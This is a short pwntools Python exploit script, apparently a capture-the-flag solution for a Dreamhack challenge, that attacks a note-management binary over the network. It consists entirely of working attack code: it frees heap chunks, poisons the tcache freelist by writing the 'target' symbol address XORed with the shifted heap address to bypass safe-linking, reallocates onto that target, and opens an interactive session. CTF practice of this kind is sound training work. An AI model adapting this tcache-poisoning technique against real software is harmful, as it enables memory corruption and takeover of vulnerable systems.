from pwn import *
p = remote('host3.dreamhack.games', 12084)
e = ELF('./main')

def create_note(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    return int(p.recvline().strip().split(b' ')[-1], 16)

def delete_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit_note(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', content)

heap_addr = create_note(0)
create_note(1)
create_note(2)

delete_note(2)
delete_note(1)
delete_note(0)

edit_note(0, p64(e.symbols['target'] ^ (heap_addr >> 12)))

create_note(0)
create_note(1)
edit_note(1, b'A')

p.sendlineafter(b'> ', b'4')
p.interactive()